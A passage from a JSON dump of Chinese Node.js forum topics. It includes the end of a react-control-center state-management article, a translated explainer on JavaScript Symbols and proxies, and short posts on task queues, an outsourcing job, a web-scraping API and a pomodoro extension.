{count:8, info:&#x27;i am global&#x27;}\n    }\n}\n</code></pre><p>注意我们没有书写<code>constructor</code>，<code>cc</code>为我们合成出了<code>state</code>,让我们稍作修改</p>\n<pre class=\"prettyprint\"><code>@cc.r(&#x27;Bar&#x27;,{m:&#x27;counter&#x27;, s:&#x27;*&#x27;, g:&#x27;*&#x27;})\nclass Bar extends Component{\n    constructor(props, context){\n        super(props, context);\n        this.state = {myPrivateKey:&#x27;666&#x27;}\n    }\n    render(){\n       console.log(this.state);\n       &#x2F;&#x2F; {count:8, info:&#x27;i am global&#x27;, myPrivateKey:&#x27;666&#x27;}\n    }\n}\n</code></pre><p>如果我们在<code>constructor</code>给<code>count</code>赋值100，打印出来的<code>state</code>里的<code>count</code>还是8，因为这个值被<code>cc</code>从<code>store</code>恢复回来了，你写的值被覆盖了，这一点要注意</p>\n<pre class=\"prettyprint\"><code> console.log(this.state);\n &#x2F;&#x2F; {count:8, info:&#x27;i am global&#x27;, myPrivateKey:&#x27;666&#x27;}\n</code></pre><p>除非你注册时，没有申明任何共享的<code>sharedStateKeys</code>，尽管这个<code>cc class</code>属于<code>counter</code>，但是将不会收<code>counter</code>模块里任何<code>key</code>变化的影响哦</p>\n<pre class=\"prettyprint\"><code>@cc.r(&#x27;Bar&#x27;,{m:&#x27;counter&#x27;})\n</code></pre><p>说到这里，依然还是正面回答标题里提出的疑问：一切从state获取是不是违背原则。因为我们从一开始就被告知，<code>state</code>是自己管理管理的转态，<code>props</code>上派发下来的状态才是需要共享的状态，我们仔细思考一下，在<code>cc</code>里你只要定义的<code>key</code>和<code>store</code>的<code>key</code>不重复，就不发生共享关系，或者你<code>register</code>时刻意设定某些想关心的<code>key</code>,也可以让你的<code>key</code>成为私有的<code>state</code>。</p>\n<pre class=\"prettyprint\"><code>counter store: {key:1,key2:2, key3:3}\n\n@cc.r(&#x27;Bar&#x27;,{m:&#x27;counter&#x27;,s:[&#x27;key1&#x27;,&#x27;key2&#x27;]})\nclass Bar extends Component{\n    constructor(props, context){\n        this.state = {key3:888888};\n    }\n    render(){\n        console.log(this.state);\n        &#x2F;&#x2F;{key:1,key2:2, key3:888888}\n    }\n}\n</code></pre><p>打印结果会看到<code>{key:1,key2:2, key3:888888}</code><br>\n尽管counter模块里有<code>key1</code> <code>key2</code> <code>key3</code>,但是你注册时只共享了<code>key1</code>,<code>key2</code>，所以<code>key3</code>还是你私有的<code>state</code>      ，如果你调用<code>setState({key1:666,key2:888,key3:999})</code>时，<br>\n<code>{key1:666,key2:888,key3:999}</code>会赋值给自己，然后<code>cc</code>提取出<code>{key1:666,key2:888}</code>广播出去。</p>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/10/16966650ccd8eb11?w=1438&amp;h=1298&amp;f=png&amp;s=180564\" alt></p>\n<h4>不想用<code>state</code>来承载<code>store</code>的数据可以吗</h4>\n<p>如果你不喜欢用<code>state</code>来获取<code>store</code>的数据，只想干干净净的用<code>state</code>来做自己组件的状态管理，<code>cc</code>同样提供<code>$$propState</code>来获取<code>store</code>上的数据，上图里用户看到最后一步有一个<code>broadcastPropState</code>，完成此项工作。<br>\n我们重写<code>Bar</code></p>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F;@cc.register(&#x27;Bar&#x27;,{stateToPropMapping:{&#x27;counter&#x2F;count&#x27;:&#x27;count&#x27;}})\n@cc.r(&#x27;Bar&#x27;,{pm:{&#x27;counter&#x2F;count&#x27;:&#x27;count&#x27;}})\nclass Bar extends Component{\n    constructor(props, context){\n        this.state = {key3:888888};\n    }\n    render(){\n        console.log(this.$$propState);\n        &#x2F;&#x2F;{count:8}\n    }\n}\n</code></pre><p><code>stateToPropMapping</code>复杂完成把模块上的某些<code>key</code>映射到<code>$$propState</code>的<code>key</code>,大家可能留意到，<code>stateToPropMapping</code>的<code>key</code>是带模块名的，值作为<code>$$propState</code>的<code>key</code>可以被重命名，是因为这样做<code>cc class</code>可以观察任意多个模块的任意<code>key</code>的变化了</p>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; 假设我们的counter模块里还有其他key如 info:&#x27;x&#x27;，\n&#x2F;&#x2F; 还有另外一个模块chart : {count:19, list:[]} \nconst pm = {\n    &#x27;counter&#x2F;count&#x27;:&#x27;count&#x27;,\n    &#x27;counter&#x2F;info&#x27;:&#x27;info&#x27;,  \n    &#x27;chart&#x2F;count&#x27;:&#x27;chart_count&#x27;\n}\n@cc.r(&#x27;Bar&#x27;,{pm})\n\n console.log(this.$$propState);\n &#x2F;&#x2F; {count:8, info:&#x27;x&#x27;, chart_count:19}\n</code></pre><p>当你在别的地方修改<code>chart</code>的<code>count</code>值的为10000时候，<code>Bar</code>的<code>render</code>会被触发渲染，你会看到<code>chart_count</code>变为10000</p>\n<pre class=\"prettyprint\"><code> console.log(this.$$propState);\n &#x2F;&#x2F; {count:8, info:&#x27;x&#x27;, chart_count:10000}\n</code></pre><p>如果你讨厌会所有<code>key</code>起别名，但是又担心命名冲突，可以写为：</p>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F; 假设我们的counter模块里还有其他key如 info:&#x27;x&#x27;，\n&#x2F;&#x2F; 还有另外一个模块chart : {count:19, list:[]} \nconst pm = {\n    &#x27;counter&#x2F;*&#x27;:&#x27;&#x27;, \n    &#x27;chart&#x2F;*&#x27;:&#x27;&#x27;\n}\n@cc.r(&#x27;Bar&#x27;,{pm, isPropStateModuleMode:true})\n&#x2F;&#x2F; 也可以直接写为\n@cc.connect(&#x27;Bar&#x27;, pm)\n\n console.log(this.$$propState);\n &#x2F;&#x2F; {counter:{count:8, info:&#x27;x&#x27;}, chart:{chart_count:19}}\n</code></pre><p>当然这里要注意，这样写你其实关心这两个模块所有<code>key</code>变化了，根据实际场景来做判断需不需要标记<code>*</code>，实际上<code>register</code>是可以一起写<code>sharedStateKeys</code>和<code>stateToPropMapping</code>的，这样的话组件即从<code>this.state</code>拿到<code>store</code>罪行的数据，也能从<code>this.$$propState</code>上拿到<code>store</code>最新的数据</p>\n<h4>关于无状态组件怎么复用<code>cc</code>里现有的业务逻辑？CcFragment给你答案</h4>\n<p>19年<code>facebook</code>给<code>react</code>赋能<code>hooks</code>后，都觉得以后慢慢的不需要<code>class</code>组件了，直接使用<code>function</code>组件能搞定一切？各种<code>useState</code>、<code>useEffect</code>、<code>useContext</code>已经被标准化，看起来<code>function</code>组件能够慢慢替代<code>class</code>组件了，可是我们仔细想想，我们期望状态集中管理，状态变化可以被精确追踪，<code>hooks</code>必然还需要一段很长的路走，我们看看<code>cc</code>给出对无状态组件怎么复用reducer给出的答案</p>\n<pre class=\"prettyprint\"><code>import {CcFragment} from &#x27;&#x27;\nconst MyPanel = ()=&gt;{\n    return (\n        &lt;div&gt;\n            &lt;CcFragment ccKey=&quot;clickMeChangeCount&quot; connect={{&#x27;counter&#x2F;*&#x27;:&#x27;&#x27;}}&gt;\n                {\n                    ({propState, setState})=&gt;(\n                        &lt;div onClick={()=&gt;setState(&#x27;counter&#x27;, {count:200})}&gt;{propState.counter.count}&lt;&#x2F;div&gt;\n                    )\n                }\n            &lt;&#x2F;CcFragment&gt;\n            &lt;CcFragment ccKey=&quot;changeFooModuleState&quot; connect={{&#x27;foo&#x2F;*&#x27;:&#x27;&#x27;}}&gt;\n                {\n                    ({propState, dispatch})=&gt;(\n                        &lt;div onClick={()=&gt;dispatch(&#x27;foo&#x2F;changeName&#x27;, &#x27;newName&#x27;)}&gt;{propState.foo.name}&lt;&#x2F;div&gt;\n                    )\n                }\n            &lt;&#x2F;CcFragment&gt;\n        &lt;&#x2F;div&gt;\n    );\n}\n</code></pre><h4>让我们调戏UI</h4>\n<p>现在你可以打开<code>console</code>，输入<code>cc</code>回车，你会发现<code>cc</code>已经将<code>api</code>绑定到了<code>window.cc</code>下了，你可以输入<code>cc.setState(moduleName, newPartialState)</code>直接触发渲染，当然前提是有相关的UI已经挂载到界面上，要不然只是改变了<code>store</code>，视图并没有说明变化，除此之外，其他的<code>cc.emit</code>，<code>cc.dispatch</code>等使用方法和你在<code>cc class</code>是一样的使用体验，让你可以快速验证一些你的渲染逻辑哦。<br>\n输入<code>sss</code>回车，可以查看<code>cc</code>最新的整个状态树。</p>\n<hr>\n<h3>结语</h3>\n<p>综上所诉，<code>cc</code>挑战前辈的资本，在于只是提供了最基础的api，却可以让你用更轻松的方式分离你的业务逻辑和视图渲染逻辑，以及更优雅的方式复用你的函数，因为对于对于<code>cc</code>来说，它们更像是一个个<code>newPartialStateCreator</code>，厌倦了<code>redux</code>的你，能不能在<code>cc</code>里找到你想要的答案呢？</p>\n<ul>\n<li><a href=\"https://stackblitz.com/edit/dva-example-count-1saxx8?file=index.js\">在线示例点我</a></li>\n<li><a href=\"https://github.com/fantasticsoul/react-control-center\">cc版本ant-design-pro</a></li>\n<li><a href=\"https://github.com/fantasticsoul/rcc-simple-demo\">基础入门项目</a></li>\n<li><a href=\"http://jsrun.net/vLXKp/play\">runjs录像教程</a></li>\n</ul>\n</div>","title":"react-control-center 对话 redux(家族)，后生何以挑战前辈？","last_reply_at":"2019-03-19T03:42:48.579Z","good":false,"top":false,"reply_count":4,"visit_count":4589,"create_at":"2019-03-10T11:35:33.002Z","author":{"loginname":"fantasticsoul","avatar_url":"https://avatars0.githubusercontent.com/u/7334950?v=4&s=120"}},{"id":"5c8fce498a587f26b426bd96","author_id":"5a4b33097b5fe91a4a6788ee","tab":"ask","content":"<div class=\"markdown-text\"><p>JS 为什么要分Microtask 和 Macrotask 两种任务队列呢。应用在哪里。查了很多文档，都是介绍的，却没有人说明应用，可能是答案太过简单？</p>\n</div>","title":"JS 为什么要分Microtask 和 Macrotask 两种任务队列呢。应用在哪里。","last_reply_at":"2019-03-19T03:36:25.292Z","good":false,"top":false,"reply_count":2,"visit_count":631,"create_at":"2019-03-18T16:58:49.474Z","author":{"loginname":"AholeChan","avatar_url":"https://avatars1.githubusercontent.com/u/27280299?v=4&s=120"}},{"id":"5c8efb2dacb681372d419227","author_id":"56cb313d66c88b5e490260a9","tab":"share","content":"<div class=\"markdown-text\"><p>需求：从Google搜索订阅的RSS拿到数据，自动发布到bbs.zuqiuxunlian.com网站的新闻板块。\nRSS源：<a href=\"https://www.google.com/alerts/feeds/06602601644343027574/4041603352429017360\">https://www.google.com/alerts/feeds/06602601644343027574/4041603352429017360</a>\n发布到：<a href=\"https://bbs.zuqiuxunlian.com/?tab=news\">https://bbs.zuqiuxunlian.com/?tab=news</a>\n<img src=\"https://static.cnodejs.org/Ft1u87atoV9ePE8fuO6WV3JWuaW2\" alt>\n预算：500以内\n有兴趣的给我报个价。</p>\n</div>","title":"【外包】从单一google快讯上获取快讯，发布到网站上","last_reply_at":"2019-03-19T03:05:10.848Z","good":false,"top":false,"reply_count":10,"visit_count":703,"create_at":"2019-03-18T01:58:05.995Z","author":{"loginname":"awong1900","avatar_url":"https://avatars1.githubusercontent.com/u/4022612?v=4&s=120"}},{"id":"5c905b6596558e26e1b66bdc","author_id":"58d140302c8bf2a836456213","tab":"share","content":"<div class=\"markdown-text\"><p><strong>摘要：</strong> 为什么比怎么用更有意义。</p>\n<ul>\n<li>原文：<a href=\"https://segmentfault.com/a/1190000018522663\">JavaScript 为什么要有 Symbol 类型</a></li>\n<li>作者：<a href=\"https://segmentfault.com/a/1190000017794020\">前端小智</a></li>\n</ul>\n<p>Symbols 是 <strong>ES6</strong> 引入了一个新的数据类型 ，它为 <strong>JS</strong> 带来了一些好处，尤其是对象属性时。 但是，它们能为我们做些字符串不能做的事情呢?</p>\n<p>在深入探讨 <strong>Symbol</strong> 之前，让我们先看看一些 JavaScript 特性，许多开发人员可能不知道这些特性。</p>\n<h3>背景</h3>\n<p>js 中的数据类型总体来说分为两种，他们分别是：值<strong>类型</strong> 和 引用<strong>类型</strong></p>\n<ul>\n<li><strong>值类型（基本类型）</strong>：数值型（Number)，字符类型（String），布尔值型（Boolean），null 和 underfined</li>\n<li><strong>引用类型（类）</strong>：函数，对象，数组等</li>\n</ul>\n<p>**值类型理解：**变量之间的互相赋值，是指开辟一块新的内存空间，将变量值赋给新变量保存到新开辟的内存里面；之后两个变量的值变动互不影响，例如：</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 10; &#x2F;&#x2F;开辟一块内存空间保存变量a的值“10”；\nvar b = a; &#x2F;&#x2F;给变量 b 开辟一块新的内存空间，将 a 的值 “10” 赋值一份保存到新的内存里；\n&#x2F;&#x2F;a 和 b 的值以后无论如何变化，都不会影响到对方的值；\n</code></pre><p>一些语言，比如 C，有引用传递和值传递的概念。JavaScript 也有类似的概念，它是根据传递的数据类型推断的。如果将值传递给函数，则重新分配该值不会修改调用位置中的值。但是，如果你修改的是引用类型，那么修改后的值也将在调用它的地方被修改。</p>\n<p>**引用类型理解：**变量之间的互相赋值，只是指针的交换，而并非将对象（普通对象，函数对象，数组对象）复制一份给新的变量，对象依然还是只有一个，只是多了一个指引~~；例如：</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = { x: 1, y: 2 }; &#x2F;&#x2F;需要开辟内存空间保存对象，变量 a 的值是一个地址，这个地址指向保存对象的空间；\nvar b = a; &#x2F;&#x2F; 将a 的指引地址赋值给 b，而并非复制一给对象且新开一块内存空间来保存；\n&#x2F;&#x2F; 这个时候通过 a 来修改对象的属性，则通过 b 来查看属性时对象属性已经发生改变；\n</code></pre><p>值类型（神秘的 NaN 值除外）将始终与具有相同值的另一个值类型的完全相等，如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>const first = &quot;abc&quot; + &quot;def&quot;;\nconst second = &quot;ab&quot; + &quot;cd&quot; + &quot;ef&quot;;\nconsole.log(first === second); &#x2F;&#x2F; true\n</code></pre><p>但是完全相同结构的引用类型是不相等的：</p>\n<pre class=\"prettyprint language-javascript\"><code>const obj1 = { name: &quot;Intrinsic&quot; };\nconst obj2 = { name: &quot;Intrinsic&quot; };\nconsole.log(obj1 === obj2); &#x2F;&#x2F; false\n&#x2F;&#x2F; 但是，它们的 .name 属性是基本类型:\nconsole.log(obj1.name === obj2.name); &#x2F;&#x2F; true\n</code></pre><p>对象在 JavaScript 语言中扮演重要角色，它们的使用无处不在。对象通常用作键/值对的集合，然而，以这种方式使用它们有一个很大的限制: 在 <strong>symbol</strong> 出现之前，对象键只能是字符串，如果试图使用非字符串值作为对象的键，那么该值将被强制转换为字符串，如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>const obj = {};\nobj.foo = &#x27;foo&#x27;;\nobj[&#x27;bar&#x27;] = &#x27;bar&#x27;;\nobj[2] = 2;\nobj[{}] = &#x27;someobj&#x27;;\nconsole.log(obj);\n&#x2F;&#x2F; { &#x27;2&#x27;: 2, foo: &#x27;foo&#x27;, bar: &#x27;bar&#x27;,\n     &#x27;[object Object]&#x27;: &#x27;someobj&#x27; }\n</code></pre><h3>Symbol 是什么</h3>\n<p><strong>Symbol()</strong> 函数会返回 symbol 类型的值，该类型具有静态属性和静态方法。它的静态属性会暴露几个内建的成员对象；它的静态方法会暴露全局的 symbol 注册，且类似于内建对象类，但作为构造函数来说它并不完整，因为它不支持语法：<code>&quot;new Symbol()&quot;</code>。所以使用 Symbol 生成的值是不相等：</p>\n<pre class=\"prettyprint language-javascript\"><code>const s1 = Symbol();\nconst s2 = Symbol();\nconsole.log(s1 === s2); &#x2F;&#x2F; false\n</code></pre><p>实例化 <strong>symbol</strong> 时，有一个可选的第一个参数，你可以选择为其提供字符串。 此值旨在用于调试代码，否则它不会真正影响<strong>symbol</strong> 本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>const s1 = Symbol(&quot;debug&quot;);\nconst str = &quot;debug&quot;;\nconst s2 = Symbol(&quot;xxyy&quot;);\nconsole.log(s1 === str); &#x2F;&#x2F; false\nconsole.log(s1 === s2); &#x2F;&#x2F; false\nconsole.log(s1); &#x2F;&#x2F; Symbol(debug)\n</code></pre><h3>symbol 作为对象属性</h3>\n<p>symbol 还有另一个重要的用途,它们可以用作对象中的键，如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>const obj = {};\nconst sym = Symbol();\nobj[sym] = &quot;foo&quot;;\nobj.bar = &quot;bar&quot;;\nconsole.log(obj); &#x2F;&#x2F; { bar: &#x27;bar&#x27; }\nconsole.log(sym in obj); &#x2F;&#x2F; true\nconsole.log(obj[sym]); &#x2F;&#x2F; foo\nconsole.log(Object.keys(obj)); &#x2F;&#x2F; [&#x27;bar&#x27;]\n</code></pre><p>乍一看，这看起来就像可以使用 <strong>symbol</strong> 在对象上创建私有属性，许多其他编程语言在其类中有自己的私有属性，私有属性遗漏一直被视为 JavaScript 的缺点。</p>\n<p>不幸的是，与该对象交互的代码仍然可以访问其键为 symbol 的属性。 在调用代码尚不能访问 symbol 本身的情况下，这甚至是可能的。 例如，<code>Reflect.ownKeys()</code> 方法能够获取对象上所有键的列表，包括字符串和 symbol ：</p>\n<pre class=\"prettyprint language-javascript\"><code>function tryToAddPrivate(o) {\n    o[Symbol(&quot;Pseudo Private&quot;)] = 42;\n}\nconst obj = { prop: &quot;hello&quot; };\ntryToAddPrivate(obj);\nconsole.log(Reflect.ownKeys(obj));\n&#x2F;&#x2F; [ &#x27;prop&#x27;, Symbol(Pseudo Private) ]\nconsole.log(obj[Reflect.ownKeys(obj)[1]]); &#x2F;&#x2F; 42\n</code></pre><blockquote>\n<p>注意:目前正在做一些工作来处理在 JavaScript 中向类添加私有属性的问题。这个特性的名称被称为<a href=\"https://github.com/tc39/proposal-class-fields#private-fields\">私有字段</a>，虽然这不会使所有对象受益，但会使类实例的对象受益。私有字段从 Chrome 74 开始可用。</p>\n</blockquote>\n<p><strong>代码部署后可能存在的 BUG 没法实时知道，事后为了解决这些 BUG，花了大量的时间进行 log 调试，这边顺便给大家推荐一个好用的 BUG 监控工具 <a href=\"http://shiyuaniot.com:8888/daqian/daqian.jpg\">Fundebug</a>。</strong></p>\n<h3>防止属性名称冲突</h3>\n<p>符号可能不会直接受益于 JavaScript 为对象提供私有属性。然而，他们是有益的另一个原因。当不同的库希望向对象添加属性而不存在名称冲突的风险时，它们非常有用。</p>\n<p>Symbol 为 JavaScrit 对象提供私有属性还有点困难，但 Symbol 还有别外一个好处，就是避免当不同的库向对象添加属性存在命名冲突的风险。</p>\n<p>考虑这样一种情况:两个不同的库想要向一个对象添加基本数据，可能它们都想在对象上设置某种标识符。通过简单地使用 <code>id</code> 作为键，这样存在一个巨大的风险，就是多个库将使用相同的键。</p>\n<pre class=\"prettyprint language-javascript\"><code>function lib1tag(obj) {\n    obj.id = 42;\n}\nfunction lib2tag(obj) {\n    obj.id = 369;\n}\n</code></pre><p>通过使用 Symbol，每个库可以在实例化时生成所需的 Symbol。然后用生成 Symbol 的值做为对象的属性：</p>\n<pre class=\"prettyprint language-javascript\"><code>const library1property = Symbol(&quot;lib1&quot;);\nfunction lib1tag(obj) {\n    obj[library1property] = 42;\n}\nconst library2property = Symbol(&quot;lib2&quot;);\nfunction lib2tag(obj) {\n    obj[library2property] = 369;\n}\n</code></pre><p>出于这个原因，Symbol 似乎确实有利于 JavaScript。</p>\n<p>但是，你可能会问，为什么每个库在实例化时不能简单地生成随机字符串或使用命名空间？</p>\n<pre class=\"prettyprint language-javascript\"><code>const library1property = uuid(); &#x2F;&#x2F; random approach\nfunction lib1tag(obj) {\n    obj[library1property] = 42;\n}\nconst library2property = &quot;LIB2-NAMESPACE-id&quot;; &#x2F;&#x2F; namespaced approach\nfunction lib2tag(obj) {\n    obj[library2property] = 369;\n}\n</code></pre><p>这种方法是没错的，这种方法实际上与 Symbol 的方法非常相似,除非两个库选择使用相同的属性名，否则不会有冲突的风险。</p>\n<p>在这一点上，聪明的读者会指出，这两种方法并不完全相同。我们使用唯一名称的属性名仍然有一个缺点:它们的键非常容易找到，特别是当运行代码来迭代键或序列化对象时。考虑下面的例子:</p>\n<pre class=\"prettyprint language-javascript\"><code>const library2property = &quot;LIB2-NAMESPACE-id&quot;; &#x2F;&#x2F; namespaced\nfunction lib2tag(obj) {\n    obj[library2property] = 369;\n}\nconst user = {\n    name: &quot;Thomas Hunter II&quot;,\n    age: 32\n};\nlib2tag(user);\nJSON.stringify(user);\n&#x2F;&#x2F; &#x27;{&quot;name&quot;:&quot;Thomas Hunter II&quot;,&quot;age&quot;:32,&quot;LIB2-NAMESPACE-id&quot;:369}&#x27;\n</code></pre><p>如果我们为对象的属性名使用了 Symbol，那么 JSON 输出将不包含它的值。这是为什么呢? 虽然 JavaScript 获得了对 Symbol 的支持，但这并不意味着 JSON 规范已经改变! JSON 只允许字符串作为键，JavaScript 不会尝试在最终 JSON 有效负载中表示 Symbol 属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>const library2property = &quot;f468c902-26ed-4b2e-81d6-5775ae7eec5d&quot;; &#x2F;&#x2F; namespaced approach\nfunction lib2tag(obj) {\n    Object.defineProperty(obj, library2property, {\n        enumerable: false,\n        value: 369\n    });\n}\nconst user = {\n    name: &quot;Thomas Hunter II&quot;,\n    age: 32\n};\nlib2tag(user);\nconsole.log(user); &#x2F;&#x2F; {name: &quot;Thomas Hunter II&quot;, age: 32, f468c902-26ed-4b2e-81d6-5775ae7eec5d: 369}\nconsole.log(JSON.stringify(user)); &#x2F;&#x2F; {&quot;name&quot;:&quot;Thomas Hunter II&quot;,&quot;age&quot;:32}\nconsole.log(user[library2property]); &#x2F;&#x2F; 369\n</code></pre><p>通过将 <code>enumerable</code> 属性设置为 <code>false</code> 而“隐藏”的字符串键的行为非常类似于 Symbol 键。它们通过 <code>Object.keys()</code> 遍历也看不到，但可以通过 <code>Reflect.ownKeys()</code> 显示，如下的示例所示:</p>\n<pre class=\"prettyprint language-javascript\"><code>const obj = {};\nobj[Symbol()] = 1;\nObject.defineProperty(obj, &quot;foo&quot;, {\n    enumberable: false,\n    value: 2\n});\nconsole.log(Object.keys(obj)); &#x2F;&#x2F; []\nconsole.log(Reflect.ownKeys(obj)); &#x2F;&#x2F; [ &#x27;foo&#x27;, Symbol() ]\nconsole.log(JSON.stringify(obj)); &#x2F;&#x2F; {}\n</code></pre><p>在这点上，我们几乎重新创建了 Symbol。隐藏的字符串属性和 Symbol 都对序列化器隐藏。这两个属性都可以使用<code>Reflect.ownKeys()</code>方法读取，因此它们实际上不是私有的。假设我们为属性名的字符串版本使用某种名称空间/随机值，那么我们就消除了多个库意外发生名称冲突的风险。</p>\n<p>但是，仍然有一个微小的区别。由于字符串是不可变的，而且 Symbol 总是保证惟一的，所以仍然有可能生成字符串组合会产生冲突。从数学上讲，这意味着 Symbol 确实提供了我们无法从字符串中得到的好处。</p>\n<p>在 Node.js 中，检查对象时(例如使用 <code>console.log()</code> )，如果遇到名为 <code>inspect</code> 的对象上的方法，将调用该函数，并将打印内容。可以想象，这种行为并不是每个人都期望的，通常命名为 <code>inspect</code> 的方法经常与用户创建的对象发生冲突。</p>\n<p>现在 Symbol 可用来实现这个功能，并且可以在 <code>equire('util').inspect.custom</code> 中使用。<code>inspect</code> 方法在 Node.js v10 中被废弃，在 v1 1 中完全被忽略, 现在没有人会偶然改变检查的行为。</p>\n<h3>模拟私有属性</h3>\n<p>这里有一个有趣的方法，我们可以用来模拟对象上的私有属性。这种方法将利用另一个 JavaScript 特性: proxy（代理）。代理本质上封装了一个对象，并允许我们对与该对象的各种操作进行干预。</p>\n<p>代理提供了许多方法来拦截在对象上执行的操作。我们可以使用代理来说明我们的对象上可用的属性，在这种情况下，我们将制作一个隐藏我们两个已知隐藏属性的代理，一个是字符串 <code>_favColor</code>，另一个是分配给 <code>favBook</code> 的 S ymbol ：</p>\n<pre class=\"prettyprint language-javascript\"><code>let proxy;\n\n{\n    const favBook = Symbol(&quot;fav book&quot;);\n\n    const obj = {\n        name: &quot;Thomas Hunter II&quot;,\n        age: 32,\n        _favColor: &quot;blue&quot;,\n        [favBook]: &quot;Metro 2033&quot;,\n        [Symbol(&quot;visible&quot;)]: &quot;foo&quot;\n    };\n\n    const handler = {\n        ownKeys: target =&gt; {\n            const reportedKeys = [];\n            const actualKeys = Reflect.ownKeys(target);\n\n            for (const key of actualKeys) {\n                if (key === favBook || key === &quot;_favColor&quot;) {\n                    continue;\n                }\n                reportedKeys.push(key);\n            }\n\n            return reportedKeys;\n        }\n    };\n\n    proxy = new Proxy(obj, handler);\n}\n\nconsole.log(Object.keys(proxy)); &#x2F;&#x2F; [ &#x27;name&#x27;, &#x27;age&#x27; ]\nconsole.log(Reflect.ownKeys(proxy)); &#x2F;&#x2F; [ &#x27;name&#x27;, &#x27;age&#x27;, Symbol(visible) ]\nconsole.log(Object.getOwnPropertyNames(proxy)); &#x2F;&#x2F; [ &#x27;name&#x27;, &#x27;age&#x27; ]\nconsole.log(Object.getOwnPropertySymbols(proxy)); &#x2F;&#x2F; [Symbol(visible)]\nconsole.log(proxy._favColor); &#x2F;&#x2F; &#x27;blue&#x27;\n</code></pre><p>使用 <code>_favColor</code> 字符串很简单：只需阅读库的源代码即可。 另外，通过蛮力找到动态键(例如前面的 <code>uuid</code> 示例)。但是，如果没有对 Symbol 的直接引用，任何人都不能 从<code>proxy</code> 对象访问’Metro 2033’值。</p>\n<p><strong>Node.js 警告</strong>：Node.js 中有一个功能会破坏代理的隐私。 JavaScript 语 言本身不存在此功能，并且不适用于其他情况，例 如 Web 浏览器。 它允许在给定代理时获得对底层对象的访问权。 以下是使用此功能打破上述私有属性示例的示例：</p>\n<pre class=\"prettyprint language-javascript\"><code>const [originalObject] = process.binding(&quot;util&quot;).getProxyDetails(proxy);\nconst allKeys = Reflect.ownKeys(originalObject);\nconsole.log(allKeys[3]); &#x2F;&#x2F; Symbol(fav book)\n</code></pre><p>现在，我们需要修改全局 <code>Reflect</code> 对象，或者修改 <code>util</code> 流程绑定，以防止它们在特定的 Node.js 实例中使用。但这是一个可怕的兔子洞。如果你对掉进这样一个兔子洞感兴趣，请查看我们的其他博客文章: <a href=\"https://medium.com/intrinsic/protecting-your-javascript-apis-9ce5b8a0e3b5\">Protecting your JavaScript APIs。</a></p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"JavaScript 为什么要有 Symbol 类型？","last_reply_at":"2019-03-19T03:00:53.626Z","good":false,"top":false,"reply_count":0,"visit_count":774,"create_at":"2019-03-19T03:00:53.626Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5a6c1d4c9288dc81532882af","author_id":"5a6c18f59288dc81532882ac","tab":"ask","content":"<div class=\"markdown-text\"><p>求一些2018年的前端面试题及侧重的知识点；\n近几年，前端知识迭代很快，面试题也需要推陈出新一下，担心知识点考察不到位</p>\n</div>","title":"求一些2018年的前端面试题及侧重的知识点","last_reply_at":"2019-03-19T01:02:07.753Z","good":false,"top":false,"reply_count":3,"visit_count":3905,"create_at":"2018-01-27T06:33:48.627Z","author":{"loginname":"andyiwen","avatar_url":"https://avatars0.githubusercontent.com/u/18592006?v=4&s=120"}},{"id":"5c8fcf948a587f26b426bda4","author_id":"55c56e8a39273b9219336288","tab":"share","content":"<div class=\"markdown-text\"><ul>\n<li><a href=\"https://cloudquery.t9t.io/\">体验网页版</a></li>\n<li><a href=\"https://github.com/t9tio/cloudquery\">cloudquery 代码开源在 github</a></li>\n</ul>\n<h2>screenshot</h2>\n<p><img src=\"https://user-images.githubusercontent.com/5512552/51655619-6b978580-1fd8-11e9-93a9-9accf8e25e54.gif\" alt></p>\n<h2>API</h2>\n<p>Example url: <a href=\"https://2uvlp0y13b.execute-api.us-west-2.amazonaws.com/staging/query?url=https://news.ycombinator.com/best&amp;selectors=*:nth-child(1)%20%3E%20*%20%3E%20*:nth-child(2)%20%3E%20*:nth-child(2)%20%3E%20*:nth-child(1),*:nth-child(3)%20*:nth-child(1)%20%3E%20*:nth-child(3)%20%3E%20*:nth-child(1)\">https://cloudquery.t9t.io/query?url=https://news.ycombinator.com/best&amp;selectors=*:nth-child(1) &gt; * &gt; *:nth-child(2) &gt; *:nth-child(2) &gt; <em>:nth-child(1),</em>:nth-child(3) *:nth-child(1) &gt; *:nth-child(3) &gt; *:nth-child(1)</a></p>\n<p>Query params:</p>\n<ul>\n<li>url: url of the webpage you want to fetch</li>\n<li>selectors: css selectors describing the elements interests you</li>\n</ul>\n<p>Returns:</p>\n<ul>\n<li>innerText: element innerText</li>\n<li>href: element href</li>\n</ul>\n</div>","title":"cloudquery: 把任意网站变成 serverless API","last_reply_at":"2019-03-18T17:04:20.852Z","good":false,"top":false,"reply_count":0,"visit_count":516,"create_at":"2019-03-18T17:04:20.852Z","author":{"loginname":"timqian","avatar_url":"https://avatars3.githubusercontent.com/u/5512552?v=4&s=120"}},{"id":"5c8fcd7c8a587f26b426bd93","author_id":"55c56e8a39273b9219336288","tab":"share","content":"<div class=\"markdown-text\"><ul>\n<li><a href=\"https://chrome.google.com/webstore/detail/gffgechdocgfajkbpinmjjjlkjfjampi/\">从 chrome 应用商店下载 tomato-pie</a></li>\n<li><a href=\"https://github.com/t9tio/tomato-pie/\">tomato-pie 代码开源在github</a></li>\n</ul>\n<p><img src=\"https://raw.githubusercontent.com/timqian/images/master/tomatopie-header.gif\" alt></p>\n<h3>Features</h3>\n<ul>\n<li>start new pomodoro from TODO list</li>\n<li>red part: 25 minutes for one tomato</li>\n<li>green part: 5 minutes for 